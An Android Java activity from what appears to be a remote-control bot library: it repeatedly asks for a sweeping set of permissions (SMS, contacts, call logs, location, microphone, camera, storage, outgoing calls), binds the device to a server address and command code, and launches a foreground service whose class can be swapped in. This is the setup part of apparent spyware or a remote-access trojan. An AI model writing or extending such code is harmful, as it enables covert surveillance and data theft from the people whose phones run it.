package com.candroid.lofl.activities;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.preference.PreferenceManager;

import com.candroid.lofl.api.Bot;
import com.candroid.lofl.services.LoflService;

public class LoflActivity extends BackPressedActivity {
    public static final int PERMISSIONS_REQUEST_CODE = 25;
    public static final String SERVICE_NAME_KEY = "SERVICE_NAME_KEY";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestPermissions();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case PERMISSIONS_REQUEST_CODE:
                for(int result : grantResults){
                    if(result != PackageManager.PERMISSION_GRANTED){
                        requestPermissions();
                        return;
                    }
                }
                if (!LoflService.sIsRunning) {
                    String serviceName = PreferenceManager.getDefaultSharedPreferences(this).getString(SERVICE_NAME_KEY, LoflService.class.getName());
                    try {
                        startForegroundService(new Intent(this, Class.forName(serviceName)));
                    } catch (ClassNotFoundException e) {
                        e.printStackTrace();
                        startForegroundService(new Intent(this, LoflService.class));
                    }
                }
                setResult(Activity.RESULT_OK);
                finish();
                break;
            default:
                break;
        }
    }

    /*parse sms messages in devices default sms inbox location*/
    public void requestPermissions() {
        if ((checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) || checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED || checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED || checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED || checkSelfPermission(Manifest.permission.READ_CALENDAR) != PackageManager.PERMISSION_GRANTED || checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED || checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED || checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED || checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.MODIFY_PHONE_STATE, Manifest.permission.INTERNET, Manifest.permission.READ_CONTACTS, Manifest.permission.BROADCAST_SMS, Manifest.permission.READ_CALL_LOG, Manifest.permission.RECEIVE_MMS, Manifest.permission.RECEIVE_WAP_PUSH, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_CALENDAR, Manifest.permission.RECORD_AUDIO, Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.CHANGE_WIFI_STATE, Manifest.permission.READ_PHONE_NUMBERS, Manifest.permission.READ_PHONE_STATE, Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.CALL_PHONE, Manifest.permission.CAMERA, Manifest.permission.VIBRATE, Manifest.permission.SET_WALLPAPER, Manifest.permission.INTERNET, Manifest.permission.CAMERA, Manifest.permission.FOREGROUND_SERVICE, Manifest.permission.PROCESS_OUTGOING_CALLS, Manifest.permission.WRITE_CONTACTS, Manifest.permission.SET_ALARM, Manifest.permission.WRITE_CALL_LOG}, PERMISSIONS_REQUEST_CODE);
        }else{
            if (!LoflService.sIsRunning) {
                String serviceName = PreferenceManager.getDefaultSharedPreferences(this).getString(SERVICE_NAME_KEY, LoflService.class.getName());
                try {
                    startForegroundService(new Intent(this, Class.forName(serviceName)));
                } catch (ClassNotFoundException e) {
                    e.printStackTrace();
                    startForegroundService(new Intent(this, LoflService.class));
                }
            }
            setResult(Activity.RESULT_OK);
            finish();
        }
    }

    public static void bind(Context context, String serverAddress, String commandCode, String activityName, String serviceName){
        Bot.bind(serverAddress, commandCode);
        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context);
        preferences.getString(SERVICE_NAME_KEY, LoflService.class.getName());
        ((Activity)context).startActivityForResult(new Intent(context, LoflActivity.class), LoflActivity.PERMISSIONS_REQUEST_CODE);
        SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
        sharedPreferences.getString(SERVICE_NAME_KEY, LoflService.class.getName());
        sharedPreferences.getString(LoflService.NOTIFICATION_CLICK_ACTIVITY, LoflActivity.class.getName());
        if(!(activityName == null && serviceName == null)){
            SharedPreferences.Editor editor = sharedPreferences.edit();
            if((activityName != null)){
                editor.putString(LoflService.NOTIFICATION_CLICK_ACTIVITY, activityName);
            }
            if(serviceName != null){
                editor.putString(LoflActivity.SERVICE_NAME_KEY, serviceName);
            }
            editor.apply();
        }

    }
}
